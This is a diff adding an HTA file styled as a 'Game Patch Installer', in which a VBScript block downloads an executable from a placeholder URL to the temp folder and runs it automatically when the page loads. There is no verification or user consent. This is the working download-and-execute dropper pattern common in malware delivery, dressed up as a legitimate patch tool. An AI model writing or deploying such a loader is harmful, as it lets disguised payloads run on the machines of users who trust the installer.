@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Game Patch Installer</title>
+    <HTA:APPLICATION 
+        ID="PatchInstaller"
+        APPLICATIONNAME="Game Patch Installer"
+        BORDER="thin"
+        CAPTION="yes"
+        SCROLL="no"
+        SINGLEINSTANCE="yes"
+        SYSMENU="yes"
+    >
+</head>
+<body>
+<script type="text/vbscript">
+    Sub DownloadAndExecute()
+        Dim objXMLHTTP, objADOStream, objFSO, tempFolder, tempFile
+
+        ' Define the patch URL and name
+        patchURL = "https://example.com/patch.exe" ' Replace with your actual URL
+        patchName = "patch.exe"
+
+        ' Get the temp folder path
+        Set objFSO = CreateObject("Scripting.FileSystemObject")
+        tempFolder = objFSO.GetSpecialFolder(2) ' Temporary Folder
+        tempFile = tempFolder & "\" & patchName
+
+        ' Download the patch
+        Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
+        objXMLHTTP.Open "GET", patchURL, False
+        objXMLHTTP.Send
+
+        If objXMLHTTP.Status = 200 Then
+            Set objADOStream = CreateObject("ADODB.Stream")
+            objADOStream.Open
+            objADOStream.Type = 1 ' Binary
+            objADOStream.Write objXMLHTTP.ResponseBody
+            objADOStream.Position = 0 ' Reset the stream
+
+            ' Save to temp file
+            objADOStream.SaveToFile tempFile, 2 ' Overwrite if exists
+            objADOStream.Close
+
+            ' Execute the patch
+            CreateObject("WScript.Shell").Run tempFile, 1, False
+        Else
+            MsgBox "Failed to download the patch. HTTP Status: " & objXMLHTTP.Status
+        End If
+    End Sub
+
+    ' Execute the download and patching process
+    DownloadAndExecute()
+</script>
+</body>
+</html>
